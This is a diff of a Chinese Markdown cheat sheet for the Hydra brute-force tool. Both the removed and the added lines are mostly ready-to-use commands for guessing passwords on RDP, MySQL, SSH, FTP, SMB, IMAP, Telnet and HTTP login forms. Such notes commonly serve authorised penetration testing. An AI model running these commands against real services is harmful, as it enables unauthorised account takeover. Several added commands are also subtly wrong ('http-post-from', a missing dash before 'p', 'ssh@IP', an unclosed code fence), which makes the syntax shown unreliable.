@@ -1,49 +1,43 @@
-### hydra
+### Hydra
+hydra 的基本命令格式
+~~~bash
+hydra [options] server://IP/URL
 
-破解rdp(3389)：
+## 常用语法
+~~~bash
+# 指定服务和目标
+hydra -l <userName> -p <password> <IP> <server>
 
-`hydra -l administrator -P password.txt -V IP rdp`
+# 对FTP服务进行单用户密码爆破
+hydra -l admin -p 123456 192.168.1.1 ftp
 
-破解mysql：
+# 使用用户名和密码字典
+hydra -L <userNameDict> -P <passwordDict> <IP> <server>
+~~~
 
-`hydra ip -L 用户名 -P pass.txt -V mysql`
+## SSH爆破
+~~~bash
+hydra -L <userNameDict> -P <passwordDict> ssh@IP
+# 指定端口
+hydra -s PORT -L <userNameDict> -P <passwordDict> ssh://IP
+~~~
 
-破解ssh：
+## HTTP登录页面爆破
+~~~bash
+# HTTP GET
+hydra -L <userNameDict> p <passwordDict> http-get://IP/
 
-`hydra -L user.txt -P password.txt -e ns -vV IP ssh`
+# HTTP POST 表单
+hydra -L <userNameDict> -P <passwordDict> <IP> http-post-from "/login:username=^USER^&password=^PASS^:F=Login failed"
 
-破解https：
+# 使用代理 添加
+-x <socks5://proxy>
 
-`hydra -m /index.php -l muts -P pass.txt IP https`
+# 设置线程
+-t <number>
+~~~
 
-破解teamspeak：
-
-`hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak`
-
-破解cisco：
-
-`hydra -P pass.txt IP cisco`
-
-`hydra -m cloud -P pass.txt IP cisco-enable`
-
-破解smb：
-
-`hydra -l administrator -P pass.txt IP smb`
-
-破解pop3：
-
-`hydra -l muts -P pass.txt my.pop3.mail pop3`
-
-破解http-proxy：
-
-`hydra -l admin -P pass.txt http-proxy://IP`
-
-破解imap：
-
-`hydra -L user.txt -p imap://ip PLAIN`
-
-`hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN`
-
-破解telnet
-
-`hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V`
+## Telnet爆破
+~~~bash
+hydra -L <userNameDict> -P <passwordDict> telnet://IP
+~~~
